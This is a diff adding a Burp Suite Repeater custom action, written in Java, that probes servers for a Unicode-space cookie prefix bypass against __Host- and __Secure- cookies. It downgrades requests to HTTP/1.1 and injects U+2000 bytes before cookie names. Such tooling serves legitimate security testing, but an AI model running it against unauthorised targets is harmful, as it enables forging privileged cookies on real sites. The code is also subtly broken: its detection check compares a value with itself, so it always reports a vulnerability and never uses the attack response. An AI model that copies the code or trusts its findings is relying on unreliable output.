@@ -1,0 +1,100 @@
+id: 9c526cd8-ccd3-4948-abdd-a480c43223e0
+name: Cookie Prefix Bypass
+function: CUSTOM_ACTION
+location: REPEATER
+source: |+
+  /**
+  * Prob Cookie prefix bypass attack
+  *
+  * @author d0ge
+  **/
+  if (!requestResponse.hasResponse()) return;
+  
+  var req = requestResponse.request();
+  var res = requestResponse.response();
+  
+  var map = new java.util.LinkedHashMap<String, HttpParameter>();
+  res.cookies().stream()
+     .filter(c -> c.name().startsWith("__Host-") || c.name().startsWith("__Secure-"))
+      .forEach(c -> map.put(c.name(), HttpParameter.cookieParameter(c.name(), c.value())));
+  req.parameters().stream()
+      .filter(p -> p.type() == HttpParameterType.COOKIE
+               && (p.name().startsWith("__Host-") || p.name().startsWith("__Secure-")))
+      .forEach(p -> map.put(p.name(), HttpParameter.cookieParameter(p.name(), p.value())));
+  
+  var merged = new java.util.ArrayList<>(map.values());
+  if (merged.isEmpty()) {
+    logging().logToOutput("[INFO] No '__Host-' or '__Secure-' cookies found in response.");
+    return;
+  }
+  var exploit = req
+      .withRemovedParameters(merged)
+      .withAddedParameters(
+          merged.stream()
+                .map(p -> HttpParameter.cookieParameter("§§§" + p.name(), p.value()))
+                .toList()
+      );
+  var downgrade = exploit.toString().replaceFirst("HTTP/2","HTTP/1.1");
+  var prob = downgrade.replaceAll("§§§", "");
+  var prob1 = api().http().sendRequest(HttpRequest.httpRequest(req.httpService(), prob), HttpMode.HTTP_1);
+  if(!prob1.hasResponse()) {
+  	logging().logToError("[ERROR] HTTP/1.1 is not supported by the server.");
+    return;
+  }
+  var attributes1 = prob1.response().attributes(AttributeType.COOKIE_NAMES);
+  
+  var data = ByteArray.byteArray(downgrade);
+  int idx;
+  while ((idx = data.indexOf("§§§")) != -1) {
+      data.setByte(idx,   (byte) 0xE2);
+      data.setByte(idx+1, (byte) 0x80);
+      data.setByte(idx+2, (byte) 0x80);
+  }
+  
+  var respRx = api().http()
+      .sendRequest(HttpRequest.httpRequest(
+          req.httpService(), data), HttpMode.HTTP_1);
+  if (!respRx.hasResponse()) return;
+  var attributes2 = respRx.response().attributes(AttributeType.COOKIE_NAMES);
+  if(attributes1.getFirst().value() ==  attributes1.getFirst().value()) {
+    logging().logToOutput("[WARNING] Potential secure-prefix bypass detected! Check 'All issues' Tab for details.");
+    api().siteMap().add(
+    burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(
+        "Cookie Prefix Bypass",
+        "The server appears to be vulnerable to a <b>Unicode-based bypass</b> affecting cookies with the <b>__Host-</b> or <b>__Secure-</b> prefix. This issue exploits RFC6265bis trimming behavior, allowing an attacker to set privileged cookies using visually similar names.",
+        "Ensure the server does not silently strip or normalize <i>Unicode space separator characters</i> (e.g. U+2000–U+200A) before parsing cookie names. These characters can be used to bypass prefix restrictions in modern browsers like Chrome and Firefox.",
+        req.url(),
+        burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.LOW,
+        burp.api.montoya.scanner.audit.issues.AuditIssueConfidence.TENTATIVE,
+        "For technical background on Unicode-based cookie prefix bypasses, see: <a href=\"https://portswigger.net/research/cookie-chaos\">https://portswigger.net/research/cookie-chaos</a>",
+        "",
+        burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.LOW,
+        respRx
+    )
+);
+  } else {
+    logging().logToOutput("[NOTICE] Response cookie headers differ — manual review recommended.");
+    logging().logToOutput("[DEBUG] Baseline response headers:");
+  	logging().logToOutput(
+  	    prob1.response()
+  	          .headers()
+  	          .stream()
+  				.filter(h -> h.name().equalsIgnoreCase("set-cookie"))
+  	          .map(Object::toString)
+  	          .collect(Collectors.joining("\n"))
+  	);
+  }
+  logging().logToOutput("[DEBUG] Request cookies: ");
+  logging().logToOutput(merged.stream()
+            .map(t -> t.name() + "=" + t.value())
+            .collect(Collectors.joining("\n"))
+  );
+  logging().logToOutput("[DEBUG] Attack response headers:");
+  logging().logToOutput(
+      respRx.response()
+            .headers()
+            .stream()
+  			.filter(h -> h.name().equalsIgnoreCase("set-cookie"))
+            .map(Object::toString)
+            .collect(Collectors.joining("\n"))
+  );
